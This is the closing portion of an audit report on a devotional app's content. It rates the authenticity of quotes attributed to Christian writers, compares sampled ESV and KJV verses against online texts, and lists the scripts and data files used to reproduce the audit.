| 756 | Abraham Kuyper | Inaugural Address at the Free University of Amsterdam (1880) | verified (well-known text; not web-checked in this audit) | desk | popular paraphrase of 'not a square inch… over which Christ… does not cry: Mine!' |
| 757 | Abraham Kuyper | Lectures on Calvinism (1898), Lecture III ('Politics') | paraphrase-presented-as-quote | web | textbook definition, not Kuyper's sentence; Lecture III wording differs |
| 758 | Abraham Kuyper | To Be Near Unto God (1908), Preface | paraphrase-presented-as-quote | web | CCEL preface has no such sentence |
| 759 | Abraham Kuyper | Encyclopedia of Sacred Theology (1894), Part I | paraphrase-presented-as-quote | desk |  |
| 760 | Abraham Kuyper | Common Grace (Gemeene Gratie, 1902-1904), vol. 1 | paraphrase-presented-as-quote | desk |  |
| 761 | D.A. Carson | The Difficult Doctrine of the Love of God (2000), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 762 | D.A. Carson | The Cross and Christian Ministry (1993), Introduction | paraphrase-presented-as-quote | desk |  |
| 763 | D.A. Carson | A Call to Spiritual Reformation (Praying with Paul, 1992), Introduction | paraphrase-presented-as-quote | desk |  |
| 764 | D.A. Carson | The Intolerance of Tolerance (2012) | paraphrase-presented-as-quote | desk |  |
| 765 | Sinclair Ferguson | The Whole Christ (2016), ch. 3 | paraphrase-presented-as-quote | desk |  |
| 766 | Sinclair Ferguson | The Christian Life (1981), ch. 6 | paraphrase-presented-as-quote | desk |  |
| 767 | Sinclair Ferguson | In Christ Alone (2007), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 768 | Sinclair Ferguson | Devoted to God (2016), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 769 | Kevin Vanhoozer | Is There a Meaning in This Text? (1998), ch. 5 | paraphrase-presented-as-quote | desk |  |
| 770 | Kevin Vanhoozer | The Drama of Doctrine (2005), Introduction | paraphrase-presented-as-quote | desk |  |
| 771 | Kevin Vanhoozer | Biblical Authority after Babel (2016), Introduction | paraphrase-presented-as-quote | desk |  |
| 772 | Michael Reeves | Delighting in the Trinity (2012), ch. 1 | paraphrase-presented-as-quote | web | actual: 'Christianity is not primarily about lifestyle change; it is about knowing God' |
| 773 | Michael Reeves | Rejoicing in Christ (2015), Introduction | paraphrase-presented-as-quote | web | Intro titled 'Christianity Is Christ'; actual wording differs |
| 774 | Michael Reeves | The Unquenchable Flame (2009), Introduction | paraphrase-presented-as-quote | desk |  |
| 775 | Dane Ortlund | Gentle and Lowly (2020), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 776 | Dane Ortlund | Gentle and Lowly (2020), ch. 2 | paraphrase-presented-as-quote | desk |  |
| 777 | Dane Ortlund | Deeper (2021), Introduction | paraphrase-presented-as-quote | web | actual: 'Growing in Christ is not centrally improving or adding or experiencing but deepening' |
| 778 | G.K. Chesterton | The Thing (1929), 'The Drift from Domesticity' | verified (well-known text; not web-checked in this audit) | desk | exact |
| 779 | G.K. Chesterton | What's Wrong with the World (1910), Part I, ch. 5 | verified (well-known text; not web-checked in this audit) | desk | exact |
| 780 | G.K. Chesterton | Heretics (1905), 'On the Wit of Whistler' | verified (well-known text; not web-checked in this audit) | desk | Heretics ch. 17 exact |
| 781 | Francis Schaeffer | The God Who Is There (1968), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 782 | Francis Schaeffer | He is There and He is Not Silent (1972) | paraphrase-presented-as-quote | desk |  |
| 783 | Francis Schaeffer | The Mark of the Christian (1970) | paraphrase-presented-as-quote | desk |  |
| 784 | Francis Schaeffer | True Spirituality (1971), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 785 | John Stott | The Cross of Christ (1986), ch. 6 | verified (well-known text; not web-checked in this audit) | desk | ch. 6 exact |
| 786 | John Stott | Basic Christianity (1958), ch. 1 | verified | web | ch. 1: 'in essence, Christianity is Christ'; second sentence matches pre-2008 wording |
| 787 | John Stott | Between Two Worlds (1982), Introduction | paraphrase-presented-as-quote | desk |  |
| 788 | John Stott | The Living Church (2007), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 789 | A.W. Tozer | The Knowledge of the Holy (1961), ch. 1 | verified (well-known text; not web-checked in this audit) | desk | ch. 1 opening exact |
| 790 | A.W. Tozer | The Pursuit of God (1948), ch. 1 | paraphrase-presented-as-quote | desk |  |
| 791 | A.W. Tozer | God's Pursuit of Man (1950), ch. 1 | misattributed | web | Augustine, Confessions I.1, quoted by Tozer in The Pursuit of God (1948) ch. 3 — wrong author and wrong book |
| 792 | A.W. Tozer | The Root of the Righteous (1955) | verified (well-known text; not web-checked in this audit) | desk | 'Praise God for the Furnace' exact |
| 793 | Elisabeth Elliot | Through Gates of Splendor (1957) / interviews | probably-genuine-but-unlocated | web | three-sentence form only on quote sites; 'Do the next thing' is an anonymous poem (Minnie Paull 1897) Elliot quoted |
| 794 | Elisabeth Elliot | Suffering Is Never for Nothing (2019, posth.) | probably-genuine-but-unlocated | desk | duplicate of #211 with a different source; wording 'a lot better' matches the circulating form |
| 795 | Amy Carmichael | If (1938), opening reflection | verified (well-known text; not web-checked in this audit) | desk | If, exact |
| 796 | Amy Carmichael | Edges of His Ways (1955) | fabricated | web | first clause is Ps 25:14 KJV; second sentence zero hits |
| 797 | Hannah Whitall Smith | The Christian's Secret of a Happy Life (1875), ch. 2 | paraphrase-presented-as-quote | desk |  |
| 798 | Hannah Whitall Smith | The God of All Comfort (1906) | fabricated | web | CCEL full text checked; absent |
| 799 | Corrie ten Boom | The Hiding Place (1971) — quoting her sister Betsie at Ravensbrück | verified (well-known text; not web-checked in this audit) | desk | duplicate of #212 |
| 800 | Corrie ten Boom | Tramp for the Lord (1974) | verified (well-known text; not web-checked in this audit) | desk | exact |
| 801 | Susanna Wesley | Letter to John Wesley, June 8, 1725 | verified (well-known text; not web-checked in this audit) | desk | letter of 8 Jun 1725 exact |
| 802 | Joni Eareckson Tada | A Place of Healing (2010) | misattributed | web | Steve Estes' words, credited by Joni herself (Ligonier); popularised via When God Weeps (1997) |
| 803 | Joni Eareckson Tada | When God Weeps (1997), ch. 4 | paraphrase-presented-as-quote | desk |  |

## Appendix B — Scripture spot-check (60 entries: 40 ESV, 20 KJV)

Sources: ESV via biblegateway.com (verse numbers, footnote/cross-reference markers and headings stripped); KJV via bible-api.com. Word-level comparison after normalising case, punctuation and quote marks; every non-exact hit inspected by hand. Counts: EXACT 37 (ESV 26, KJV 11); PUNCT-ONLY 16 (ESV 9, KJV 7); WORD-DIFF 7 (ESV 5, KJV 2); WRONG-LABEL 0; UNFETCHED 0. No footnote text, verse numbers or ellipses leaked (the one corpus-wide ellipsis, #65 Hab 3:17-18, was outside this sample and is reported in H3).

| idx | ref | label | result | detail |
|---|---|---|---|---|
| 3 | Numbers 6:24-26 | ESV | EXACT | all 3 verses present |
| 268 | Psalm 131:1-2 | ESV | EXACT | omits superscription (acceptable) |
| 250 | Psalm 32:1-2 | ESV | EXACT | omits superscription (acceptable) |
| 260 | Psalm 95:6-7 | ESV | WORD-DIFF | v7 truncated: ESV continues "Today, if you hear his voice," — dropped, no ellipsis |
| 25 | Psalm 145:8-9 | ESV | EXACT | |
| 270 | Psalm 139:13-14 | ESV | EXACT | |
| 4 | Deuteronomy 6:4-5 | ESV | PUNCT-ONLY | opening quote mark missing |
| 242 | Psalm 8:3-4 | ESV | EXACT | |
| 44 | Isaiah 6:3 | ESV | WORD-DIFF (leading clause dropped) | ESV begins "And one called to another and said:" |
| 58 | Hosea 6:6 | ESV | EXACT | |
| 472 | Exodus 3:14 | ESV | PUNCT-ONLY | double→single quotes; nested quotes flattened; small-caps I AM as caps |
| 278 | Proverbs 16:3 | ESV | EXACT | |
| 68 | Zechariah 4:6 | ESV | WORD-DIFF (leading clause dropped) | ESV begins "Then he said to me, 'This is the word of the LORD to Zerubbabel:" |
| 471 | Genesis 50:20 | ESV | EXACT | |
| 258 | Psalm 86:11 | ESV | EXACT | |
| 52 | Jeremiah 17:9 | ESV | EXACT | |
| 365 | 1 Corinthians 1:30-31 | ESV | PUNCT-ONLY | double→single quotes |
| 390 | Ephesians 1:13-14 | ESV | EXACT | |
| 401 | Philippians 4:6-7 | ESV | EXACT | lowercase "do not be anxious" correctly preserved |
| 300 | Matthew 22:37-39 | ESV | PUNCT-ONLY | double→single quotes; closing quote added (ESV quote runs to v40) |
| 428 | Titus 1:1-2 | ESV | EXACT | correctly ends mid-sentence |
| 94 | Romans 8:38-39 | ESV | EXACT | |
| 315 | Luke 2:10-11 | ESV | PUNCT-ONLY | double→single quotes; closing quote added (quote runs to v12) |
| 294 | Matthew 6:9-10 | ESV | WORD-DIFF (leading clause dropped) | ESV begins "Pray then like this:" |
| 317 | Luke 2:29-30 | ESV | PUNCT-ONLY | opening quote missing; period added (sentence continues in v31) |
| 90 | Romans 3:23-24 | ESV | PUNCT-ONLY | "For all" capitalised (mid-sentence from v22); period for comma |
| 106 | Galatians 5:22-23 | ESV | WORD-DIFF | v23 truncated: ESV continues "; against such things there is no law." |
| 406 | Colossians 2:6-7 | ESV | EXACT | |
| 311 | Mark 10:27 | ESV | PUNCT-ONLY | double→single quotes |
| 455 | Jude 1:3 | ESV | EXACT | |
| 341 | John 17:3 | ESV | EXACT | |
| 447 | 1 Peter 2:9 | ESV | EXACT | |
| 299 | Matthew 16:18 | ESV | EXACT | |
| 92 | Romans 8:1 | ESV | EXACT | |
| 146 | 1 John 1:9 | ESV | EXACT | |
| 339 | John 14:27 | ESV | EXACT | |
| 137 | James 1:17 | ESV | EXACT | |
| 349 | Acts 20:24 | ESV | EXACT | |
| 380 | 2 Corinthians 13:14 | ESV | EXACT | |
| 347 | Acts 16:31 | ESV | PUNCT-ONLY | double→single quotes |
| 549 | Lamentations 3:32-33 | KJV | EXACT | |
| 557 | Daniel 7:13-14 | KJV | EXACT | |
| 504 | 2 Samuel 7:12-13 | KJV | EXACT | |
| 543 | Jeremiah 9:23-24 | KJV | WORD-DIFF | v24 truncated: KJV continues ": for in these things I delight, saith the LORD."; LORD→Lord |
| 492 | Numbers 21:8-9 | KJV | PUNCT-ONLY | LORD→Lord |
| 467 | Genesis 12:2-3 | KJV | EXACT | |
| 505 | 2 Samuel 22:2-3 | KJV | WORD-DIFF (leading conjunction dropped) | KJV begins "And he said, The LORD is my rock" |
| 526 | Job 42:5-6 | KJV | EXACT | |
| 476 | Exodus 20:2-3 | KJV | PUNCT-ONLY | LORD→Lord |
| 564 | Amos 4:12 | KJV | EXACT | |
| 574 | Habakkuk 2:14 | KJV | PUNCT-ONLY | LORD→Lord |
| 558 | Daniel 12:3 | KJV | EXACT | |
| 530 | Ecclesiastes 12:1 | KJV | EXACT | trailing ";" preserved |
| 489 | Deuteronomy 32:4 | KJV | EXACT | |
| 542 | Jeremiah 1:5 | KJV | EXACT | |
| 512 | 1 Chronicles 16:11 | KJV | PUNCT-ONLY | LORD→Lord |
| 497 | Judges 6:14 | KJV | PUNCT-ONLY | LORD→Lord |
| 536 | Isaiah 30:15 | KJV | PUNCT-ONLY | Lord GOD→Lord God |
| 545 | Jeremiah 23:24 | KJV | PUNCT-ONLY | LORD→Lord (x2) |
| 553 | Ezekiel 36:27 | KJV | EXACT | |

ESV verse count from refs: **477** (KJV 120); no cross-chapter ranges; no duplicate scripture refs; 41 ESV entries are ranges. Crossway cap: 500 verses / 25% of the work.

## Appendix C — Reproduction artefacts

All in the session scratchpad `…/scratchpad/redteam/`: `devotionals.json` (snapshot, md5 d2fd241f…), `render_devotional.py` / `show-devotional.sh` / `hooks.json` (snapshots), `fuzz/run.py` (30 renderer cases), `fuzz/big.json` (4,000-entry corpus), `verify_g1.txt`–`verify_g3.txt` (quote batches sent for web verification), `scripture_sample.txt`, `audit.py` / `audit_out.json` (scripture diff), `verdicts_g2g3_mine.py` (all verdict codes used to build Appendix A).
